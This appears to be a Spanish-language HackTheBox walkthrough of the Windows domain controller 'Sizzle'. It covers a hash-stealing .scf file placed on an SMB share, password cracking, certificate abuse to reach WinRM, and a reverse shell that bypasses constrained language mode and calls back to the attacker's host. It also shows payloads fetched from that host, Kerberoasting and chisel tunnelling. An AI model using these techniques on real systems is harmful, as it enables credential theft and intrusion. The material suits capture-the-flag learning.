# Sizzle-HTB
## Máquina Sizzle de HackTheBox

### Escaneo inicial con nmap

    └─# nmap -p- -sS --open --min-rate 5000 -n -Pn 10.10.10.103 -oG mapscan
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 17:56 CEST
    Nmap scan report for 10.10.10.103
    Host is up (0.043s latency).
    Not shown: 65506 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT      STATE SERVICE
    21/tcp    open  ftp
    53/tcp    open  domain
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    443/tcp   open  https
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    5986/tcp  open  wsmans
    9389/tcp  open  adws
    47001/tcp open  winrm
              
    Nmap done: 1 IP address (1 host up) scanned in 39.66 seconds

### Escaneo de servicios y scripts por defecto:

    └─# nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sCV 10.10.10.103 -oN portscan                                         
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 18:11 CEST
    Nmap scan report for 10.10.10.103
    Host is up (0.043s latency).
    
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst: 
    |_  SYST: Windows_NT
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn't have a title (text/html).
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_http-server-header: Microsoft-IIS/10.0
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_ssl-date: 2023-10-04T16:13:12+00:00; +1s from scanner time.
    |_http-title: Site doesn't have a title (text/html).
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2023-10-04T16:13:12+00:00; +1s from scanner time.
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    3269/tcp  open  ssl/ldap
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
    | Not valid before: 2018-07-02T20:26:23
    |_Not valid after:  2019-07-02T20:26:23
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-security-mode: 
    |   311: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2023-10-04T16:12:32
    |_  start_date: 2023-10-04T15:51:02
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 108.08 seconds

### Puerto 445 - SMB

Utilizando smbmap, con un nombre de usuario cualquiera para entrar como invitado - ya que a veces quizás nos dé error si entramos sin usuario - vemos una carpeta compartida interesante llamada 'Department Shares'

    smbmap -H 10.10.10.103 -u "ssa"

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/f391c096-9071-42d3-b257-3abae8893f9c)

Siguiendo con la enumeración, y listando la carpeta 'Users' dentro de 'Department Shares', podemos ver una lista de usuarios, que puede venirnos bien para el futuro:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/1f98ebfb-84c5-497a-bd5c-5d9fde3950a8)

Aprovechando que tenemos acceso con usuario anónimo (null session) sobre 'Department Shares/Users', podemos enumerar para comprobar si tenemos permisos de escritura en alguna carpeta dentro de 'Users'. Para ello, vamos a utilizar los siguientes comandos.

Primero, montamos el compartido en nuestro local para movernos más fácilmente a través de él:

    mkdir /mnt/montura
    mount -t cifs "//10.10.10.103/Department Shares" /mnt/montura

Accedemos a él y listamos:

    └─# ls -lrth
    total 0
    drwxr-xr-x 2 root root 0 jul  2  2018 bill
    drwxr-xr-x 2 root root 0 jul  2  2018 bob
    drwxr-xr-x 2 root root 0 jul  2  2018 joe
    drwxr-xr-x 2 root root 0 jul  2  2018 henry
    drwxr-xr-x 2 root root 0 jul  2  2018 amanda
    drwxr-xr-x 2 root root 0 jul  2  2018 morgan
    drwxr-xr-x 2 root root 0 jul  2  2018 jose
    drwxr-xr-x 2 root root 0 jul  2  2018 amanda_adm
    drwxr-xr-x 2 root root 0 jul  2  2018 chris
    drwxr-xr-x 2 root root 0 jul  2  2018 mrb3n
    drwxr-xr-x 2 root root 0 jul 10  2018 lkys37en
    drwxr-xr-x 2 root root 0 oct  4 19:09 Public

Comprobamos por ejemplo el de la usuaria 'amanda' utilizando smbcacls:

    smbcacls "//10.10.10.103/Department Shares" Users/amanda -N
        REVISION:1
        CONTROL:SR|DI|DP
        OWNER:BUILTIN\Administrators
        GROUP:HTB\Domain Users
        ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
        ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
        ACL:Everyone:ALLOWED/OI|CI|I/READ
        ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL

Tenemos que fijarnos en 'Everyone', que en este caso tienen el permiso 'READ'. Vamos a comprobar todos los demás directorios automáticamente:

    for directory in $(ls); do echo -e "\n [+] Comprobando permisos para el directorio $directory:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep "Everyone")";done

El directorio 'Public' tiene permisos 'FULL' para 'Everyone':

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/21777aa2-f1e4-4534-8bcc-3819f5d3e3ec)

Esto significa que podemos escribir, crear nuevos archivos en este directorio. Sabiendo que es una carpeta compartida, podemos crear un .scf malicioso para intentar conseguir algún hash.

    └─# cat click.scf 
    [Shell]
    Command=2
    IconFile=\\10.10.14.18\smbfolder\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop

Creamos el archivo y por otro lado nos ponemos en escucha con, por ejemplo, smbserver.py (También podriamos hacerlo con 'responder', quitando 'smbfolder' del parámetro 'IconFile'.

    /opt/impacket/examples/smbserver.py smbfolder $(pwd) -smb2support

Recibimos el hash de la usuaria 'amanda':

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/86e4e78c-3fa0-4027-9ccb-4eb7e6a18079)

Utilizando JTR podemos crackear el hash y obtenemos la contraseña de 'amanda' en texto claro:

    john --wordlist=/usr/share/wordlists/rockyou.txt amanda.hash

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/09d15863-30b0-4c7d-9175-248739e88af6)

Comprobamos con CME que la contraseña es válida:

    crackmapexec smb 10.10.10.103 -u amanda -p 'REDACTED'

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/6a2f0b71-c6c6-4e88-9823-c49a3408ff15)

También probamos con 'winrm', pero nos da un error desconocido:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/e2a91eed-5dd9-4238-a729-4a0542fa993f)

Si volvemos a nuestro escaneo nmap de servicios, veremos que además del puerto por defecto de 'winrm' 5985, también está abierto el puerto 5986, que se utiliza también para conectarse a 'winrm' a través del protocolo SSL:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/25d37d49-1b8e-4cce-ad5f-47e30ced48fa)

Para ello, necesitamos añadirle los siguientes parámetros:

    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate

### Puerto 80 - HTTP

Utilizando la herramienta de fuzzing 'gobuster', encontramos varios subdirectorios:

    └─# gobuster dir -u http://10.10.10.103/ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt 

La mayoría de ellos nos devuelven un error '403' - Forbidden, pero si nos fijamos en '/certsrv' tenemos un 401. Es decir, que necesita credenciales para acceder:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/9799b2f8-6f19-4776-a679-36ee21268870)

Efectivamente, comprobamos que al acceder a través de 'http://10.10.10.103/certsrv' nos aparece un cuadro de diálogo con un formulario:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/d2079eda-9a8b-4ebb-a742-04c30cb9c394)

Accedemos utilziando las credenciales de 'amanda' descubiertas anteriormente. Legamos a una url de AD que nos permite generar certificados:

    Microsoft Active Directory Certificate Services  --  HTB-SIZZLE-CA  

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/89c44e98-5134-4783-8581-9fd105fa4a30)

Vamos 'Request a certificate' y después a 'advanced certificate request':

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/5ae95159-3db4-4072-a8cf-184416a26a38)

Una vez aquí, nos pide el código del certificado codificado en base64:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/9658df15-0a8c-4421-8bab-465d788f4f9f)

Para generarlo, tenemos que ejecutar el siguiente comando con 'openssl', que va a generar dos archivos: amanda.csr - clave pública - y amanda.key - clave privada.

    └─# openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr

Una vez generados, consultamos la clave pública 'amanda.csr':

    └─# cat amanda.csr 
    
    -----BEGIN CERTIFICATE REQUEST-----
    MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
    ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
    AQEBBQADggEPADCCAQoCggEBALBaK2lUO3Ay2k6s+VKlQai+NQ+QZXwgNC9L4wV+
    3gGVz0xgwAsEf4VmoG0+Crz4jl6f8rvszl2+MNESnIcAPdqneCHb41g1tkNN1T9g
    T6pIRIViMtLS0s1Xjagv28kKenX6uMUyQQkD6fsRdJ/cSLPx92NQWzcuev0RmFVe
    yVwh9v0Bc0vWzU2YYSRm0BtNJZvRCvlw662OST7ovPbCEXXFtodQIwgIFDzVE01K
    4KapSbgXLk7YX1ExR9lbQ1JVZE3XE9HrQuOzelZGOtx+t3h5hYLpuvpUO4FoXUPV
    yZl5Ym3wzvvRmDC+25l/pBc7u7WMotrvSiM3odEWQFyyZu8CAwEAAaAAMA0GCSqG
    SIb3DQEBCwUAA4IBAQBkn2RJhJO3LkN3z1/ivXXdCQgz8Ko3n3vPe4FBHF0uJf/Q
    S68X/cD7oE/OJr7NLcUuaultfsx+L68X8LDRsOMd724OXYUuV6m7VRX3gs1y6VkV
    hpR7SDaVJGa+4NzZK1AJLxKXmC3phFsh/Gxyb+oUuepfucVAQQR7dOUu6rp6ZBUr
    H83ZPHL1F4Hhjc1PuJ/PTXzVCAfn8i9pXNftPEJsWsCHIrmdRHl/Kw0T3UuPSXWc
    25OdYg/RUtX6Cs1xqqE0l4//h9mwH+mcA8dhxtEKEb227JiKkuuvWJTEd5KSdgPk
    pTtJg94cbsZpZ/M0sjMMloEqDlawZNRYwubqsctm
    -----END CERTIFICATE REQUEST-----

La copiamos y la pegamos en el generador de certificados:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/faa39601-ff51-4236-8f43-adad25c4b3b2)

Y generamos y descargamos el nuevo certificado 'certnew.cer'. 

Gracias a este certificado, podemos conectarnos al servicio 'winrm' a través del protocolo SSL:

    └─# evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p '<REDACTED>'

### 10.10.10.103 - Enumeración interna

Una vez dentro de la consola de 'winrm', intentamos subir la herramienta 'BloodHound' para exportar un esquema de usuarios y grupos del Directorio Activo, pero nos da un error:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/c6ad7195-0f0d-40d7-86cf-f73b83324302)

Esto se debe al modo del lenguaje utilizado por la máquina:

    *Evil-WinRM* PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
    ConstrainedLanguage

Para cambiarlo, podemos descargarnos el binario PSByPassCLM.exe del repositorio GitHub https://github.com/padovah4ck/PSByPassCLM y subirlo a través del método Powershell 'iwr':

    iwr -uri http://10.10.14.18/PSByPassCLM.exe -outFile PSByPassCLM.exe

Una vez subido, ejecutamos el comando siguiente apuntando a nuestro host y a nuestro puerto, que tendremos en escucha por netcat:

    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.18 /rport=443 /U C:\Users\amanda\Documents\PsBypassCLM.exe

Una vez que recibimos la shell inversa, lanzamos el comando en esta nueva shell y vemos que el lenguaje a cambiado a modo 'Full':

    PS C:\Windows\Temp\Recon> $ExecutionContext.SessionState.LanguageMode
    FullLanguage

Una vez aquí, podemos ejecutar SharpHound o cualquier otro binario sin problemas por ejemplo en C:\Windows\Temp\Recon.

Subimos 'Rubeus.exe' para ver si existe algún usuario kerberoastable:

    iwr -uri http://10.10.14.18/Rubeus.exe -OutFile r.exe

Ejecutamos el comando con nuestras credenciales de 'amanda' y descubrimos que el usuario 'mrlky' es vulnerable a un ataque Kerberoast:

    .\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/9278314e-14af-4d22-830a-8819a6182718)

Este hash es crackeable con 'Hashcat', con el método 13100:

    └─# hashcat -m 13100 -a 0 mrlky.hash /usr/share/wordlists/rockyou.txt

Obtenemos la contraseña en texto claro:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/aed69e64-78ee-4fcb-b41f-e80d37c6bb26)

### Puerto 88 - Kerberos

Si volvemos a nuestro escaneo nmap, veremos que el puerto 88 - Kerberos no aparece, cuando debería aparecer ya que es un Domain Controller.

Lo que podemos hacer para llegar al puerto 88 desde nuestro local, es un 'Remote Port Forwarding' para traernos el puerto 88 de la máquina a nuestro local. 

Ejecutamos el servidor chisel en nuestro Kali local:

    └─# chisel server -reverse -p 1234

Subimos el cliente 'chisel' a la máquina Windows:

    iwr -uri http://10.10.14.18/chisel.exe -OutFile chisel.exe

Nos conectamos a nuestro Kali local y nos llevamos los puertos 88 y 389 para que funcione correctamente:

    .\chisel client 10.10.14.18:1234 R:80:127.0.0.1:80 R:389:127.0.0.1:389

Recibimos la conexión y los dos puertos:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/a64a89e0-3d5c-430d-8a53-b142b393a25c)

Y ejecutamos el Kerberoasting desde nuestro local:

    └─# impacket-GetUserSPNs htb.local/amanda:Ashare1972 -request -dc-ip 127.0.0.1







    




